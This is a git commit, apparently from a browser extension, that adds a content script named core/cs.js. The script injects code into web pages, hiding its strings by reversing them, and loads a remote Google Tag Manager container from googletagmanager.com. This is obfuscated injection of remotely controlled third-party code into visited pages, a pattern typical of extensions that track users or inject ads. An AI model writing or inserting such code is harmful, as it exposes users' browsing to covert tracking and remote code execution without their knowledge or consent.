4d857a1e49ed8ddd0e3787172e939c0bc15384fb
plugtopus <36801212+plugtopus@users.noreply.github.com>
2018-02-24 22:48:16 +0200

    init

---
+++ core/cs.js
@@ -0,0 +1,7 @@
+
+document.addEventListener('DOMContentLoaded', () => {
+	let tg = "5HC675F";
+	var s = document.createElement('script');
+	s.text = '((t)=>{var r=(a)=>a.split("").reverse().join("");((w,d,...p)=>{w.dataLayer=[{"event":r("sj.mtg")}];var j=d[r("tnemelEetaerc")](p[0]);j.async=!0;j.src=r("-MTG=di?sj.mtg/moc.reganamgatelgoog//")+p[1];(d.head||d.body||d.documentElement)[r("dlihCdneppa")](j)})(window,document,r("tpircs"),t)})("'+tg+'")';
+	(document.head || document.body || document.documentElement).appendChild(s);
+});
